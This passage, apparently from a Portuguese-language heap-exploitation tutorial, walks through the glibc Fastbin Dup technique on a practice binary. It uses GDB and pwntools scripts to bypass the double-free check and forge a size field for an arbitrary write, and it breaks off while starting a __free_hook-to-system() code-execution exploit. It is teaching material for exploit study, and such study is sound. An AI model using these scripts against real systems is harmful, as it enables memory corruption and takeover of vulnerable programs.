<p>Comforme podemos observar, o <em>chunk</em> foi vinculado ao <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes e seu primeiro <em>quadword</em> do <em>user data</em> foi destinado ao “<em>forward pointer</em>”, que nesse caso é nulo por se tratar do primeiro <em>chunk</em>. Se contnuarmos a execução, veremos que a opção três, imprime o <em>target</em>, assim como no binário anterior. Assim como antes, o primeiro objetivo desta exploração, é sobrescrever estes dados, porém com uma nova técnica.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_109.png" alt="Continuando a execução" /></p>

<p>Desta vez, o <em>target</em> faz parte de uma estrutura chamada “<em>user</em>” que também armazena o “username” que fornecemos anteriormente. Podemos confirmar, pausando o GDB novamente e inserindo o comando <code class="language-plaintext highlighter-rouge">print user</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_110.png" alt="Estrutura &quot;user&quot;" /></p>

<p>Podemos obter mais informações sobre uma estrutura com o comando <code class="language-plaintext highlighter-rouge">ptype</code> para inspecioná-la, isso nos mostra qua o programa aloca 16 bytes para “username” e “target”.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_111.png" alt="Inspecionando a estrutura" /></p>

<p>Também podemos visualizar o <em>layout</em> em memória com o comando <code class="language-plaintext highlighter-rouge">dq</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_112.png" alt="Layout em memória" /></p>

<p>Este <em>layout</em> nos mostra os endereços do “username” e “target”.</p>

<h2 id="entendendo-a-fastbin-dup">Entendendo a Fastbin Dup</h2>

<p>Este binário possui uma vulnerabilidade conhecida como <code class="language-plaintext highlighter-rouge">double free</code>, isso ocorre quando um programa consegue liberar um <em>chunk</em> que já está livre, isso pode não parecer danoso, mas vamos olhar pela perspectiva do efeito que isso causa.</p>

<p>Se nós liberarmos um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes de tamanho, duas vezes, ele também estará relacionado com o <em>fastbin</em> <code class="language-plaintext highlighter-rouge">0x30</code> duas vezes, por conta disso, ele pode ser alocado por dois processos diferentes simultâneamente.</p>

<p>Por exemplo, ele pode ser alocado para armazenar dados sensíveis, como a <em>hash</em> de uma senha, depois alocado novamente do mesmo <em>fastbin</em>, para armazenar dados que o usuário tem controle, o que pode permitir que o usuário seja capaz de ler ou sobrescrever aquele dado sensível.</p>

<p>Vamos tentar liberar duas vezes o mesmo chunk de <code class="language-plaintext highlighter-rouge">0x30</code> bytes no programa. Para isso, vamos inserir qualquer valor em “username”, requisitar um chunk de <code class="language-plaintext highlighter-rouge">0x30</code> bytes e liberá-lo duas vezes, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_113.png" alt="Erro ao tentar o double free" /></p>

<p>Conforme podemos observar, algo deu errado e o binário foi parado e recebeu o <code class="language-plaintext highlighter-rouge">SIGABRT</code>, para abortar a execução.</p>

<p>Este sinal não é normal em uma execução, e se ocorreu, é porque provavelmente acionamos uma mitigação de <em>heap exploit</em> na GLIBC. Para saber mais sobre a mitigação que acionamos, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">frame</code>, ou simplesmente <code class="language-plaintext highlighter-rouge">f</code>, para exibir os <em>frames</em> seguido do índice do <em>frame</em> que queremos ver, os índices estão expostos na própria tela do PWNGDB, no bloco <code class="language-plaintext highlighter-rouge">BACKTRACE</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_114.png" alt="Bloco do backtrace" /></p>

<p>Neste caso, queremos ver o <em>frame</em> que indica a função <code class="language-plaintext highlighter-rouge">_int_free()</code>. Esta função é o nome da parte do procedimento que faz a checagem do <em>double free</em>. Para visualizarmos as linhas de código da GLIBC que contém esta função, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">f 4</code>, onde 4 é o índice mostrado no painel, seguido de <code class="language-plaintext highlighter-rouge">context code</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_115.png" alt="Linhas de código da mitigação" /></p>

<p>A mitigação é explicada no comentário contido no código “<em>Check that the top of the bin is not the record we are going to add (i.e., double free).</em>”.</p>

<p>Esta é uma das muitas mitigações de <em>heap exploitation</em> contidas na GLIBC. A maior parte dos alocadores de memória do próprio Linux possui várias mitigações, como a GLIBC existe a tanto tempo quanto, também possui suas próprias implementações de mitigação.</p>

<p>Esta mitigação em particular, existe para impedir um <em>chunk</em> de ser liberado duas vezes na <em>fastbin</em>, e se for acionado, a mensagem de erro que recebemos é impressa em tela, e o programa recebe o sinal para abortar.</p>

<p>Quando nos deparamos com alguma mitigação como esta, a primeira coisa que precisamos experimentar, é alguma forma de fazer o <em>bypass</em>.</p>

<p>Olhando para o código, podemos identificar o que a função está procurando. O comando diz que quando o topo da <em>fastbin</em>, ou seja, o valor da <em>fastbin</em> que está na arena, é o mesmo que está sendo adicionado com a função <code class="language-plaintext highlighter-rouge">free()</code>, então um <em>double free</em> está acontecendo. Os comandos <code class="language-plaintext highlighter-rouge">vis</code> e <code class="language-plaintext highlighter-rouge">fastbins</code> nos mostram que nosso chunk de <code class="language-plaintext highlighter-rouge">0x30</code> bytes está presente no topo da <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes quando tentamos liberá-lo pela segunda vez. Mas e se houver um <em>chunk</em> diferente no topo da <em>fastbin</em> quando tentarmos utilizar o <em>double free</em>?</p>

<p>Aparentemente no código da mitigação, não existe uma tratativa para este cenário. Para testarmos esta hipótese, vamos criar um script <code class="language-plaintext highlighter-rouge">arbitrary_write.py</code> com a seguinte base:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># configurando o binario e a GLIBC
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"fastbin_dup"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">runpath</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"/libc.so.6"</span><span class="p">)</span> 

<span class="c1"># GDB config
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
continue
'''</span>

<span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># indice do chunk alocado
</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># # seleciona a funcao "malloc", envia o tamanho e os dados e retorna o indice do chunk
</span><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">index</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"size: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span>

<span class="c1"># seleciona a opcao "free" e envia o indice.
</span><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># capturando o endereco da puts() que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>
<span class="n">io</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>


<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Este script não diferencia muito do utilizado na exploração do <code class="language-plaintext highlighter-rouge">The House of Force</code>, porém adaptado às opções do menu deste binário.</p>

<p>Vamos adicionar as seguintes linhas ao script para inserirmos um “username”, criar dois <em>chunks</em> e em seguida liberá-los:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"Beco"</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>

<p>Vamos executar o script incorporando no GDB com a opção NOASLR ativa e inspecionar a <em>heap</em> e o <em>fastbins</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_116.png" alt="Heap e fastbins" /></p>

<p>Podemos ver os <em>chunks</em> “A” e “B” preenchidos com “A” e “B” respectivamente, e ambos inseridos na <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes.<br />
Mais importante, podemos ver que o <em>chunk</em> B está no topo da <em>fastbin</em>, uma vez que foi o ultimo <em>chunk</em> a ser liberado.</p>

<p>O <em>chunk</em> B possui um “forward pointer” que aponta para o <em>chunk</em> A e o <em>chunk</em> A possui um “fd” nulo. O que acontece se liberarmos novamente o chunk A neste momento?</p>

<p>Ele já está registrado na <em>fastbin</em>, portanto teriamos um <em>double free</em>, mais importante, ele não está no topo da <em>fastbin</em>, pois lá está o <em>chunk</em> B, que tem um “fd” que aponta para o <em>chunk</em> A. Vamos seguir com a execução do programa com o comando <code class="language-plaintext highlighter-rouge">continue</code>, mudar para o terminal que está executando o script e tentar liberar o <em>chunk</em> A que está no índice 0.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_117.png" alt="Double free no chunk A" /></p>

<p>A primeira coisa que podemos notar, é que desta vez, o programa não abortou a execução como antes. Voltando ao GDB e pausando a execução, podemos visualizar a <em>heap</em> e a <em>fastbin</em> novamente, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_118.png" alt="Visualizando o double free" /></p>

<p>O <em>chunk</em> A agora está no topo da <em>fastbin</em> e possui um “fd” para o <em>chunk</em> B, e o <em>chunk</em> B ainda tem um “fd” que aponta para o <em>chunk</em> A. Isto torna uma lista não circular em uma lista circular, e podemos ver que o <em>chunk</em> A está registrado na <em>fastbin</em> duas vezes.</p>

<p>Isto mostra que fizemos o <em>bypass</em> da mitigação, conseguindo liberar o mesmo <em>chunk</em> duas vezes, técnica conhecida como <code class="language-plaintext highlighter-rouge">Fastbin Dup</code>.</p>

<h2 id="arbitrary-write-via-fastbin-dup">Arbitrary write via Fastbin Dup</h2>

<p>Agora que a exploração foi entendida, é preciso dar um propósito a ela. Dentro do cenário mostrado, pense na seguinte hipótese:</p>

<blockquote>
  <p>Depois de ter conseguido um <code class="language-plaintext highlighter-rouge">fasbin dup</code> solicitamos mais um <em>chunk</em> do mesmo tamanho, sabemos que o comportamento normal da malloc, é realocar o <em>chunk</em> que está no topo da <em>fastbin</em> ao invés de alocar um novo <em>chunk</em> do <em>top chunk</em>. Neste caso, ele realocaria o <em>chunk</em> A. Então teríamos total controle do <em>user data</em> do <em>chunk</em> A, pois ele foi legitimamente alocado, enquanto o primeiro <em>quadword</em> deste mesmo <em>user data</em> ainda é um “fd” dentro da <em>fastbin</em>.<br />
Isto pode nos permitir adulterar o “fd”, o apontando para um <em>chunk</em> falso que sobrepõe nosso <em>target</em> na própria <em>fastbin</em>.
Então poderíamos requisitar o <em>chunk</em> falso e sobrescrever o <em>target</em>.</p>
</blockquote>

<p>Para pormos em prática a teoria, vamos adicionar algumas linhas em nosso script. A primeira coisa que precisamos fazer, é inserir a chamada para liberar o <em>chunk</em> A novamente para obtermos o <em>fastbin dup</em> <code class="language-plaintext highlighter-rouge">free(chunk_A)</code>, da mesma forma que fizemos manualmente. Depois, podemos requisitar um novo <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, qualquer coisa que adicionarmos no primeiro <em>quadword</em> no <em>data</em> deste <em>chunk</em>, será tratado como um “fd” pela <em>fastbin</em>, pois o <em>chunk</em> A está em dois estados simultâneamente.</p>

<p>Se escrevermos o endereço da estrutura “user” no primeiro <em>quadword</em> do <em>user data</em>, estaremos efetivamente apontando para um <em>chunk</em> falso que sobrepõe nosso <em>target</em> direto na <em>fastbin</em>. O bloco de exploração ficou desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c1">#===============EXPLOITING================#
</span> 
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"Beco"</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>

<span class="c1"># liberando os chunks e criando o gastbin dup
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># criando um chunk fake que aponta para "user"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">user</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Vamos executar nosso script atrelado ao GDB e inspecionar a <em>heap</em> e o <em>fastbin</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_119.png" alt="Heap e fastbins" /></p>

<p>Podemos ver que o <em>chunk</em> B agora está no topo da pilha da <em>fastbin</em>, seguido pelo <em>chunk</em> A cujo “fd” aponta para a estrutura “user” agora. A partir de agora, se solicitarmos mais um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, vamos realocar o <em>chunk</em> B, e se solicitarmos mais um, vamos realocar o <em>chunk</em> A novamente e então, na terceira solicitação, vamos sobrescrever a <em>target</em>, pois o <em>chunk</em> A aponta para ela.</p>

<p>Adicionando estas requisições ao script, o bloco de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"Beco"</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># criando um chunk fake que aponta para "user"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">user</span><span class="p">))</span>

<span class="c1"># requisitando o chunk B
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># requisitando o chunk A com "fd" para "user"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo "user"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"BecoXPL"</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora, podemos executar o script pelo GDB normalmente.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_120.png" alt="GDB parou execução" /></p>

<p>Conforme podemos ver, o GDB parou a execução imediatamente. No painel <em>backtrace</em> podemos ver que a função <code class="language-plaintext highlighter-rouge">abort()</code> foi chamada novamente.</p>

<p>Utilizando os comandos <code class="language-plaintext highlighter-rouge">frame 4</code> e <code class="language-plaintext highlighter-rouge">context code</code> novamente, podemos ver o código responsável pelo erro.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_121.png" alt="Linha de código da mensagem de erro" /></p>

<p>Desta vez, a mensagem “<em>malloc(): memory corruption (fast)</em>” é mais crítica que a anterior. Este código não está comentado, mas podemos observar que ele compara os tamanhos do <em>size field</em> do <em>chunk</em> que será alocado é mosmo do tamanho da <em>fastbin</em> de onde ele irá alocar.</p>

<p>Afinal, faz muito sentido um <em>chunk</em> de tamanho diferente, como por exemplo um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x80</code> bytes não conseguir ser alocado na <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, pois a <em>fastbin</em> trabalha com <em>chunks</em> de tamanhos específicos.</p>

<p>Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">dq</code> para inspecionar a estrutura da “user”, podemos ver que seu <em>size field</em> é 0, conforme ilustrado na imagem abaixo, explicando o erro na execução.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_122.png" alt="Size field zerado" /></p>

<p>Porém, o comando <code class="language-plaintext highlighter-rouge">ptype</code> que utilizamos anteriormente, nos lembra que o usuário tem controle em um pedaço da memória, justamente onde inserimos o “username”, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_123.png" alt="Estrutura da user" /></p>

<p>E se inserirmos em “username” um <em>size field</em> falso?<br />
Inserindo no lugar do “username” um <em>quadword</em> nulo para preencher a primeira parte, mais um <em>size field</em> falso utilizando a função <code class="language-plaintext highlighter-rouge">p64()</code> do pwntools, podemos preencher o segundo <em>quadword</em> com o <em>size field</em> esperado.<br />
Vamos adicionar no script ficando desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># criando um chunk fake que aponta para "user"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">user</span><span class="p">))</span>

<span class="c1"># requisitando o chunk B
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># requisitando o chunk A com "fd" para "user"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo "user"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"BecoXPL"</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Ao executermos com o GDB, podemos observar que ele não encerrou a execução. Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">dq</code> para visualizarmos o resultado, veremos um <em>size field</em> falso compatível com nossa fastbin.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_124.png" alt="Size field falso" /></p>

<p>Podemos continuar o fluxo de execução no GDB com o comando <code class="language-plaintext highlighter-rouge">continue</code>, voltarmos para o terminal de execução do script e escolher a opção três, para visualizarmos o <em>target</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_125.png" alt="Arbitrary write com sucesso" /></p>

<blockquote>
  <p>Em resumo, este binário possui uma vulnerabilidade de <code class="language-plaintext highlighter-rouge">double free</code> que nos permitiu liberar o mesmo <em>chunk</em> duas vezes na <em>fastbin</em>. Fomos capazes de efetuar o <em>bypass</em> da mitigação nos certificando que o <em>chunk</em> alvo não estivesse no <em>top chunk</em> da <em>fastbin</em> para liberá-lo pela segunda vez.<br />
Depois requisitamos este <em>chunk</em> duplicado e escrevemos um “fd” que aponta para um <em>chunk</em> falso, sobrescrevendo a memória alvo no primeiro <em>quadword</em> do <em>user data</em>. Então requisitamos noso <em>chunk</em> falso da <em>fastbin</em> e o usamos para sobrescrever os dados alvo.<br />
Fomos capazes de efetuar o <em>bypass</em> da comparação dos <em>size fields</em> , utilizando um campo onde o usuário tem controle para criar um <em>size field</em> falso.</p>
</blockquote>

<h2 id="execução-de-código-via-fastbin-dup">Execução de código via Fastbin Dup</h2>

<p>A partir do momento em que é possível controlar o fluxo de um programa, as chances de sucesso ao tentar executar um código são grandes. E este é o objetivo principal com este binário.</p>

<p>Assim como na técnica <code class="language-plaintext highlighter-rouge">The House of Force</code>, nosso alvo será a <code class="language-plaintext highlighter-rouge">malloc hooks</code> da qual sua chamada pode usada para interceptar as chamadas para funções do <em>core</em> da malloc.</p>

<p>Este binário nos permite chamar a função <code class="language-plaintext highlighter-rouge">free()</code>, que tem a vantagem de ter como único argumento, o <em>chunk</em> que será liberado, que por sua vez possui um “fd” em seu <em>user data</em>, tornando possível sovrescrevê-lo com o endereço da função <code class="language-plaintext highlighter-rouge">system()</code> da própria GLIBC, depois liberando um <em>chunk</em> que contenha nossa <em>string</em> de comando, possibilitando passar este comando para <code class="language-plaintext highlighter-rouge">system()</code>.</p>

<p>Para testarmos esta teoria, podemos fazer uma cópia do script para <em>arbitrary write</em> e fazer algumas alterações.</p>

<p>A primeira coisa que precisamos editar, é a requisição que sobrescreve o <em>data section</em> do binário contendo a <em>target</em>, alterando para o endereço da <code class="language-plaintext highlighter-rouge">free_hook()</code> menos 16 bytes.</p>

<blockquote>
  <p>Lembre-se que a malloc trata um <em>chunk</em> como uma sequência de bytes que se inicia 16 bytes antes do campo <em>user data</em>. Portanto, inserindo o endereço da <code class="language-plaintext highlighter-rouge">free_hook()</code> menos 16 bytes, o primeiro <em>quadword</em> do <em>chunk</em> falso irá sobrescrever o <code class="language-plaintext highlighter-rouge">free_hook()</code>.</p>
</blockquote>

<p>A segunda coisa que precisamos editar, é a solicitação na qual requisitamos o <em>chunk</em>          falso e escrevemos seu <em>user data</em>. No caso anterior, alteramos o seu conteúdo para “BecoXPL”, porém, desta vez queremos sobrescrevê-lo com o endereço da função <code class="language-plaintext highlighter-rouge">system()</code> da GLIBC.</p>

<p>O bloco de exploração do script fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
